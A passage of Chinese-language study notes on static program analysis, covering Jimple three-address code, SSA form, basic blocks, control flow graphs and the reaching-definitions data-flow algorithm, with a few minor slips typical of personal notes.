class_">MethodCall3AC</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> mc.foo(<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;World&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/* 3AC (jimple) */</span><br>java.lang.String <span class="hljs-title function_">foo</span><span class="hljs-params">(java.lang.String, java.lang.String)</span>&#123;<br>    nju.sa.examples.MethodCall3AC r0;<br>    java.lang.String r1, r2, $r7;<br>    java.lang.StringBuilder $r3. $r4, $r5, $r6;<br>    <br>    r0 := <span class="hljs-meta">@this</span>: nju.sa.examples.MethodCall3AC;<br>    r1 := <span class="hljs-meta">@parameter0</span>: java.lang.String;<br>    r2 := <span class="hljs-meta">@parameter0</span>: java.lang.String;<br>    $r3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.StringBuilder;<br>    <br>    <span class="hljs-comment">// jvm里的四种方法调用</span><br>    <span class="hljs-comment">// invodespecial -&gt; 调用constructor构造函数，还可以调用父类里面的method，调用私有方法</span><br>    <span class="hljs-comment">// invokevirutal -&gt; 常用的方法调用, instance methods call，虚拟派发 </span><br>    <span class="hljs-comment">// invokeinterface -&gt; 和上面调用很像，但不做优化，会检查方法Interface是否都实现</span><br>    <span class="hljs-comment">// invokestatic -&gt; 调用静态方法</span><br>    <span class="hljs-comment">// Java7之后还有一个 invokedynamic -&gt; 作为动态语言跑在jvm上？</span><br>    <br>    specialinvoke $r3.&lt;java.lang.StringBuilder: <span class="hljs-keyword">void</span> &lt;init&gt;()&gt;();<br>    <br>    <span class="hljs-comment">// Method Signature &lt;java.lang.StringBuilder: void &lt;init&gt;()&gt;</span><br>    <span class="hljs-comment">// 包含声明所在的类名：如果有返回值，会有返回值的类型，一般情况下还会包含方法名字（参数1 类型1，参数2, 类型2）</span><br>    <br>    $r4 = virtualinvoke $r3.&lt;java.lang.StringBuilder: java.lang.StringBuilder <span class="hljs-title function_">append</span><span class="hljs-params">(java.lang.String)</span>&gt;(r1);<br>    <span class="hljs-comment">//调用$r3.&lt;java.lang...&gt;的方法的参数是r1</span><br>    <br>    $r5 = virtualinvoke $r4.&lt;java.lang.StringBuilder: java.lang.StringBuilder <span class="hljs-title function_">append</span><span class="hljs-params">(java.lang.String)</span>&gt;(<span class="hljs-string">&quot; &quot;</span>);<br>    $r6 = virtualinvoke $r5.&lt;java.lang.StringBuilder: java.lang.StringBuilder <span class="hljs-title function_">append</span><span class="hljs-params">(java.lang.String)</span>&gt;(r2);<br>    $r7 = virtualinvoke $r6.&lt;java.lang.StringBuilder: java.lang.StringBuilder <span class="hljs-title function_">append</span><span class="hljs-params">(java.lang.String)</span>&gt;(r2);<br>    <br>    <span class="hljs-keyword">return</span> $r7;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>&#123;<br>    java.lang.String[] r0;<br>    nju.sa.examples.MethodCall3AC $r3;    <br>    <br>    r0 := <span class="hljs-meta">@parameter0</span>: java.lang.String[];    <br>    $r3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">nju</span>.sa.examples.MethodCall3AC;<br>    <br>    specialinvoke $r3.&lt;nju.sa.examples.MethodCall3AC: <span class="hljs-keyword">void</span> &lt;init&gt;()&gt;();<br>    <br>    virtualinvoke $r3.&lt;nju.sa.examples.MethodCall3AC: java.lang.String <span class="hljs-title function_">foo</span><span class="hljs-params">(java.lang.String,java.lang.String)</span>&gt;(<span class="hljs-string">&quot;Hello&quot;</span>,<span class="hljs-string">&quot;World&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>Class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/* Class JAVA Source code*/</span><br><span class="hljs-keyword">package</span> nju.sa.examples;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Class3AC</span> &#123;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> <span class="hljs-variable">pi</span> <span class="hljs-operator">=</span> <span class="hljs-number">3.14</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/* 3AC (jimple) */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">nju</span>.sa.examples.Class3AC <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.lang.object&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">double</span> pi;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> &lt;init&gt;()&#123;<br>        <br>nju.sa.examples.Class3AC r0;<br>        <br>        r0 := <span class="hljs-meta">@this</span>: nju.sa.examples.Class3AC;<br>        <br>        specicalinvoke <span class="hljs-number">30.</span>&lt;java.lang.object: <span class="hljs-keyword">void</span> &lt;init&gt;()&gt;();<br>        <br>        <span class="hljs-keyword">return</span>;<br>   <br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(java.lang.String[])</span>&#123;<br>        <br>        java.lang.String[] r0;<br>        <br>        r0 := <span class="hljs-meta">@parameter0</span>: java.lang.String[];<br>        <br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-comment">//clinit = class instance / class load init</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> &lt;clinit&gt;()&#123;<br>        <br>        &lt;nju.sa.examples.Class3AC: <span class="hljs-type">double</span> pi&gt; = <span class="hljs-number">3.14</span>;<br>        <br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Static-Single-Assignment（SSA）">Static Single Assignment（SSA）</h3><p>SSA是经典的IR里的一种转换格式，会给每一个定义一个新的名字，然后传播到随后的用法（Propagate fresh name to subsequent uses），并且每个变量实际上只有一种定义：</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230326184030253.png" alt="image-20230326184030253"></p><p>如果经过了一个判断，因为SSA是对每个变量实际只有一个定义，那么会引入<code>φ function</code>进行处理：</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230326184243180.png" alt="image-20230326184243180"></p><h4 id="为什么要用SSA？">为什么要用SSA？</h4><ol><li>程序流可以间接地赋值给唯一的变量，这样做的好处就是给一些流程不明显的程序提供一些程序流程上的精度。（May help deliver some simpler analyses, e.g., flow-insensitive analysis gains partial precision of flow-sensitive analysis via SSA）</li><li>Define-and-Use pairs are explicit. Enable more effective data facts storage and propagation in some on-demand tasks. Some optimization tasks perform better on SSA(e.g., conditional constant propagation, global value numbering) <s>没看懂，直接放上英文</s></li></ol><h4 id="为什么不用SSA？">为什么不用SSA？</h4><ol><li>SSA引入了很多的变量和<code>Φ函数</code></li><li>可能会存在一些性能上的问题</li></ol><h3 id="Control-Flow-Analysis（控制流分析）">Control Flow Analysis（控制流分析）</h3><p>控制流分析经常用于作为建立<code>控制流图（CFG, Control Flow Graph）</code>的参考，而CFG又是静态分析的<code>basic structure</code>。CFG中的节点可以是一个单独的三地址码的指令，或一个基本块（BB）。The node in CFG can be an individual 3-address instruction, or (usually) a Basic Block(BB).</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230326190936350.png" alt="image-20230326190936350"></p><h4 id="Basic-Block（BB）">Basic Block（BB）</h4><p>基本块是满足<strong>最多</strong>的连续的三地址指令所组成的一个序列。</p><p>Basic Block are maximal sequences of consecutive 3-address instructions with the properties that</p><ul><li>It can be entered only at the beginning, i.e., <strong>the first instruction in the block.</strong><ul><li>如果一些指令想成为一个BB，那么这个BB有且只有一个入口，并且这个入口必须是BB的第一个指令</li><li>换句话说也就是不存在另一条控制流，走到BB中的第二条或第三条命令</li></ul></li><li>It can be exited only at the end, i.e., <strong>the last instruction in the block</strong><ul><li>BB的出口应该是它最后一个指令</li><li>换言之，它的最后一个指令不应该是BB内的中间指令</li></ul></li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230326191657379.png" alt="image-20230326191657379"></p><p>P.S.: IDA里的控制流浏览，一小块一小块的就是BB</p><h4 id="如何建立Basic-Blocks">如何建立Basic Blocks</h4><p>INPUT：A sequence of 3-address instructions of P</p><p>OUTPUT：A list of basic blocks of P</p><p>METHOD：</p><ol><li>Determine the leaders in P<ol><li>The first instruction in P is a leader，第一个指令是leader</li><li>Any target instruction of a conditional or unconditional jump is a leader，所有GOTO的指令也是leader</li><li>Any instruction that immediately follows a conditional or unconditional jump is a leader，GOTO的下一行指令也是leader</li></ol></li><li>Build BBs for P<ol><li>A BB consists of a leader and all its subsequent instructions until the next leader，BB包含一个leader和后续的指令，一直到下一个leader为止。</li></ol></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk">x = input<br>y = x - <span class="hljs-number">1</span><br>z = x * y<br><span class="hljs-keyword">if</span> z &lt; x goto (<span class="hljs-number">7</span>)<br>p = x / y<br>q = p + y<br>a = q<br>b = x + a<br>c = <span class="hljs-number">2</span>a - b<br><span class="hljs-keyword">if</span> p == q goto (<span class="hljs-number">12</span>)<br>goto (<span class="hljs-number">3</span>)<br>return <br><br><br><span class="hljs-regexp">//</span> Output: BBs of P<br><span class="hljs-regexp">//</span> a:<span class="hljs-number">1</span> b: <span class="hljs-number">3</span><span class="hljs-regexp">/7/</span><span class="hljs-number">12</span> c:<span class="hljs-number">5</span><span class="hljs-regexp">/11/</span><span class="hljs-number">12</span><br><span class="hljs-regexp">//</span> leader: <span class="hljs-number">1</span><span class="hljs-regexp">/3/</span><span class="hljs-number">5</span><span class="hljs-regexp">/7/</span><span class="hljs-number">11</span>/<span class="hljs-number">12</span><br><br><span class="hljs-regexp">//</span> Build BBs <span class="hljs-keyword">for</span> P<br>B1 &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>&#125;<br>B2 &#123;<span class="hljs-number">3</span>,<span class="hljs-number">4</span>&#125;<br>B3 &#123;<span class="hljs-number">5</span>,<span class="hljs-number">6</span>&#125;<br>B4 &#123;<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;<br>B5 &#123;<span class="hljs-number">11</span>&#125;<br>B6 &#123;<span class="hljs-number">12</span>&#125;<br></code></pre></td></tr></table></figure><h4 id="Control-Flow-Graph（控制流图）">Control Flow Graph（控制流图）</h4><ul><li>The nodes of CFG are basic blocks</li><li>There is an edge from block A to block B if and only if，当且仅当存在一条从A到B的边<ul><li>There is a conditional or unconditional jump from the end of A to the beginning of B，有条件和无条件的跳转，从A的结尾指向B的开头</li><li>B immediately follows A in the original order of instructions and A does not end in an unconditional jump，在原来的指令顺序中，B紧随A，且A没有以无条件跳转的方式结束</li></ul></li><li>It is normal to replace the jumps to instruction labels by jumps to basic blocks</li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327111416580.png" alt="image-20230327111416580"></p><p>在红A和红B中，因为A里有个无条件跳转，所以应添加边；在蓝A与蓝B中，A存在一个有条件跳转，且满足e时跳转到红B，此时蓝A与蓝B之间也应该添加边，因为<strong>要满足Sound的原则，即所有的程序路径都要考虑到</strong>，此时如果不满足e时，程序会执行到蓝B的leader（图里蓝A和蓝B是紧挨着的，表示它们的三地址码也是紧接着的），依然是一条执行路径。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327130900373.png" alt="image-20230327130900373"></p><p>在一个控制流图中，通过BB的出入口可以得到该代码块的<code>前驱节点</code>和<code>后继节点</code>，其中B4的前驱节点包括B3、B2（即该两个BB的出口都是B4），后继节点包括B5（B5的入口是B4的出口）。除此之外，控制流图中还存在<code>入口</code>和<code>出口</code>。实际静态分析的时候，多线程或其他情况下，可能有多个入口（入边）；同样的，出口（出边）也会存在多个。</p><h2 id="Data-Flow-Analysis（数据流分析）">Data Flow Analysis（数据流分析）</h2><p>数据流分析是静态分析体系里非常基础的部分，它属于后端编译、优化的一种技术。</p><h3 id="Overview-of-Data-Flow-Analysis">Overview of Data Flow Analysis</h3><p>In each data-flow analysis application, we associate with every program point a <strong>data-flow value</strong> that represents an abstraction of the set of all possible <strong>program states</strong> that can be observed for that point.</p><p>实际上，静态的数据流分析最后达成的结果，就是给每一个程序的程序点关联一个数据流的值，这个值是程序状态的抽象表达（迭代算法这节中，该值所表达的是Definition reaches的状态）。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327144025931.png" alt="image-20230327144025931"></p><p>也是通过下面的迭代算法的例子，通过不断使用Transfer function来判断是否符合约束规则，来发现一个适应于safe-approximation的状态。</p><h3 id="May-and-Must-Analysis">May and Must Analysis</h3><ul><li><p>May Analysis</p><ul><li>Outputs information that may be true(<strong>over-approximation</strong>)，输出的信息可能是正确的</li></ul></li><li><p>Must Analysis</p><ul><li>Outputs information  that must be true(<strong>under-approximation</strong>)，输出的信息一定是正确的</li><li>Over- and under-approximations are <strong>both for safety of analysis.</strong>  无论是over还是under都是为了让分析的结果更精确。</li></ul><p>基于此，我们可以使用<code>Safe-approximation</code>来描述分析：</p><p>如果这个分析是May Analysis，是绝大多数的分析，那么<code>Safe-approximation</code>的<code>Safe</code>实际上为<code>Over</code>；反之是Must Analysis，是一小部分的分析，那么<code>Safe-approximation</code>的<code>Safe</code>为<code>Under</code>。<strong>一般情况下，May Analysis所做操作，会把集合内所有元素并起来；反之Must Analysis会取交集。</strong></p></li></ul><h3 id="Input-and-Output-States">Input and Output States</h3><ul><li>Each execution of an IR statement transforms an input state to a new output state. 如果一个BB被称为S1，那么它的输入状态，我们可以用<code>IN[S1]</code>表示。相应地，执行完语句之后，程序状态会变为<code>OUT[S1]</code>。</li><li>The input(output) state is associated with the program point before(after) the statement. 程序的输入和输出状态都和程序点相关联，这个程序点一般都是和语句的前和后关联。</li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327143432153.png" alt="image-20230327143432153"></p><p>图三中存在<code>meet operator</code>，是指需要将<code>OUT[S1]</code> 和<code>OUT[S2]</code>进行处理，将两个前驱输出处理后的结果作为下个后继的输入。</p><h3 id="Notation-for-Transfer-Function’s-Constraints">Notation for Transfer Function’s Constraints</h3><ul><li>Forward Analysis<ul><li>OUT[s] = f<sub>s</sub>(IN[s])<ul><li>S之前的状态IN[s]，通过传输函数fs，转换成之后的状态OUT[s]</li></ul></li></ul></li><li>Backward Analysis<ul><li>IN[s] = f<sub>s</sub>(OUT[s])<ul><li>与前向分析相反，这个是将S之后的状态OUT[s]作为输入，通过转换函数fs，将之前的状态IN[s]作为输出</li></ul></li></ul></li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327145447646.png" alt="image-20230327145447646"></p><ul><li><p>Control flow within a BB</p><ul><li>IN[s<sub>i+1</sub>] = OUT[s<sub>i</sub>]，<em>for all i = 1,2,…,n-1</em><ul><li>对于某一个BB的输入状态，是其前驱节点的输出状态</li></ul></li></ul></li><li><p>Control flow among BBs</p><ul><li><p>IN[B] = IN[s<sub>1</sub>]</p><ul><li>对于某一个BB的输入状态，其实就是其第一个语句（leader）的输入状态</li></ul></li><li><p>OUT[B] = OUT[s<sub>n</sub>]</p><ul><li>同样的，对于该BB的输出状态，就是最后一个语句的输出状态</li></ul></li><li><p>OUT[B] = f<sub>B</sub>(IN[B])，<em>f<sub>B</sub> = f<sub>s<sub>n</sub></sub> · … · f<sub>s<sub>2</sub></sub> · f<sub>s<sub>1</sub></sub></em>   （Forward Analysis）</p><ul><li>一个BB的传输函数的表示，就是里面每一个对应的传输函数的处理</li></ul></li><li><p>IN[B] = <strong>^</strong> P a predecessor of B OUT[P]</p><ul><li>The meet operator <strong>^</strong> is used to summarize the contributions from different paths at the confluence of those paths.</li><li>B的输入则是它所有的前驱的输出，通过一定的处理，作为B的输入</li></ul></li><li><p>IN[B] = f<sub>B</sub>(OUT[B])，<em>f<sub>B</sub> = f<sub>s<sub>1</sub></sub> · … · f<sub>s<sub>n-1</sub></sub> · f<sub>s<sub>n</sub></sub></em>   （Backward Analysis）</p></li><li><p>OUT[B] = <strong>^</strong> S a predecessor of B IN[S]</p><ul><li>B的输出就是其所有后继的输入状态</li></ul></li></ul></li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327151155750.png" alt="image-20230327151155750"></p><h3 id="Reaching-Definitions-Analysis">Reaching Definitions Analysis</h3><h4 id="Issues-Not-Covered（本节不会涉及到的问题）">Issues Not Covered（本节不会涉及到的问题）</h4><ul><li>Method Calls<ul><li>Intra-procedural CFG（跨函数控制流图）</li><li>Will be introduced in lecture: Inter-procedural Analysis（跨函数分析）</li></ul></li><li>Aliases<ul><li>Variables have no aliases（两个变量同时指向一个内存地址，此时称这两个变量互为别名关系）</li><li>Will be introduced in lecture: Pointer Analysis（指针分析）</li></ul></li></ul><h4 id="Reaching-Definitions">Reaching Definitions</h4><p>A definition d at program point p reaches a point q if there is path from p to q such that d is not “killed” along that path.</p><ul><li>A <strong>definition of a variable</strong> v is a statement that assigns a value to v.<ul><li>假设有一个定义v的变量，那么这个定义用d来表示。</li></ul></li><li>Translated as: definition of variable v at program point p reaches point q if there is a path from p to q such that no new definition of v appears on that path.<ul><li>在p里存在一个定义d，也就是有一个定义v的变量。那么从p到达q的程序路径中，不能够让v被重新定义（或存在v新的定义）。</li></ul></li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327152658702.png" alt="image-20230327152658702"></p><ul><li>Reaching definitions can be used to <strong>detect possible undefined variables</strong>. e.g., introduce a dummy definition for each variable v at the entry of CFG, and if the dummy definition of v reaches a point p where v is used, then v may be used before definition(<em>as undefined reaches v</em>)<ul><li>Reaching definitions 可以用来检测<strong>一个变量是否被定义</strong>。CFG可以有一个假的入口（因为CFG可以有多个入口，这个假的入口实际上没有被执行），此时引入一个没有被定义的变量，那么在变量v定义的代码块p执行之前，v都处于没有定义的状态。如果静态分析的时候发现，一直处于未定义状态的v，其未定义状态能够一直流入到要用的地方（也就是p），这就意味着v通过一条没有被初始化的路径。</li><li>这是一个may analysis，因为实际上还存在别的路径上，变量v存在初始化的可能。</li></ul></li></ul><h5 id="Understanding-Reaching-Definitions">Understanding Reaching Definitions</h5><ul><li><p>Data Flow Values/Facts</p><ul><li>The definitions of all the variables in a program</li><li>Can be represented by bit vectors<ul><li>假如程序有100个定义，那么我们可以用D1, D2, D3, …, D100来表示</li></ul></li></ul></li><li><p>Transfer Function</p><ul><li>D: v = x op y<ul><li>这个状态产生了一个关于v的定义D，并且就可以删除掉程序中，其他的关于v的定义。在这个过程中只删除v，对x和y没有影响。</li></ul></li><li>OUT[B] = gen<sub>B</sub>∪(IN[B]-<em>kill<sub>B</sub></em>)<ul><li>进入B的定义，并v的重复定义，之后并上自身的定义D，就是B的转换函数。</li></ul></li></ul></li></ul><blockquote><p>关于*kill<sub>B</sub>*范围的一些想法（个人，非官方）：</p><p>由于并不知道控制流图里准确的逻辑关系，所以可能存在一个BB成为B的前驱节点。并且在静态分析的过程中，kill掉后面的定义是没有关系的，因为在代码执行的时候，后面会重新定义；但如果不kill，从后面流入到前面的路径就会出现问题。</p></blockquote><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327155850653.png" alt="image-20230327155850653"></p><ul><li>Control Flow<ul><li>IN[B] = ∪<sub>P a predecessor of B</sub> Out[P]<ul><li>A definition reaches a program point as long as there exists at least one path along which the definition reaches.</li><li>这里的并集是指，所有到达B结果的并集。也就是说，只要至少存在一条Definition reach的路径，那么就会有一个Definition reach到达程序点。</li></ul></li></ul></li></ul><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327160016955.png" alt="image-20230327160016955"></p><h4 id="Algorithm-of-Reaching-Definitions-Analysis（定义到达算法）">Algorithm of Reaching Definitions Analysis（定义到达算法）</h4><p>Input: CFG(<em>kill<sub>B</sub></em> and <em>gen<sub>B</sub></em> computed for each basic block B)</p><p>Output: IN[B] and OUT[B] for each basic block B</p><p>METHOD:</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327161020389.png" alt="image-20230327161020389"></p><p>entry没有statement，是一个虚拟的，可以看作哨兵元素。因为没有状态，所以没有定义，故为空；对于每一个BB（排除掉entry），它的输出状态都为空。因为这个算法是适用于绝大多数的分析，在有的基本块的entry中，它的初始化状态并非为空，所以此时要排除掉entry。一般情况下，may analysis初始化状态都为空。</p><p>初始化结束之后，对于每一个BB，存在一个改变的输出状态，就执行这个循环。对每个BB（同样排除entry）使用转换函数。</p><p><strong>那么这个算法会停下来吗？</strong></p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327162600704.png" alt="image-20230327162600704"></p><p>在上面的例题中，我们给每一个定义D建立了一个位向量（bit vector）。因为这里有8个定义，所以这个CFG的Definition Reaches的位向量就是八位。0代表这个定义不能被该向量到达，1代表可以被到达。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327162822944.png" alt="image-20230327162822944"></p><p>根据算法，所有的BB的输出状态都会被置空。 如果有out被改变，就进行转换函数的迭代。执行完B1后，x和y均被定义，也就是说已经到达了D1和D2，此时位向量的状态就变成了<code>1100 0000</code>。</p><p><img src="/2023/03/21/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/image-20230327163327306.png" alt="image-20230327163327306"></p><p>现在开始执行B2，由于</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mi>N</mi><mo stretchy="false">[</mo><mi>B</mi><mo stretchy="false">]</mo><mo>=</mo><msub><mo>∪</mo><mrow><mi>P</mi><mtext> </mtext><mi>a</mi><mtext> </mtext><mi>p</mi><mi>r</mi><mi>e</mi><mi>d</mi><mi>e</mi><mi>c</mi><mi>e</mi><mi>s</mi><mi>s</mi><mi>o</mi><mi>r</mi><mtext> </mtext><mi>o</mi><mi>f</mi><mtext> </mtext><mi>B</mi></mrow></msub><mtext> </mtext><mi>O</mi><mi>u</mi><mi>t</mi><mo stretchy="false">[</mo><mi>P</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">IN[B] = ∪_{P\ a \ predecessor \ of \ B} \ Out[P]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0361em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mbin">∪</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">a</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">re</span><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">ecessor</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mspace mtight"><span class="mtight"> </span></span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mclose">]</span></span></span></span></span></p><p>也就是B2的输入状态，为所有前驱节点输出状态的UNION（并集）。这里B2的前驱节点为B1和B4，B1的输出状态<code>OUT[B1]</code>上面已经得出为<code>1100 0000</code>，而<code>B4[OUT]</code>为初始化的<code>0000 0000</code>。此时进行合并之后（对应位做与运算），得到B2的输入<code>1100 0000</code>。之后来到下一步：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>O</mi><mi>U</mi><mi>T</mi><mo stretchy="false">[</mo><mi>B</mi><mo stretchy="false">]</mo><mo>=</mo><mi>g</mi><mi>e</mi><msub><mi>n</mi><mi>B</mi></msub><mo>∪</mo><mo stretchy="false">(</mo><mi>I</mi><mi>N</mi><mo stretchy="false">[</mo><mi>B</mi><mo stretchy="false">]</mo><mo>−</mo><mi>k</mi><mi>i</mi><mi>l</mi><msub><mi>l</mi><mi>B</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">OUT[B] = gen_B ∪ (IN[B] - kill_B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" 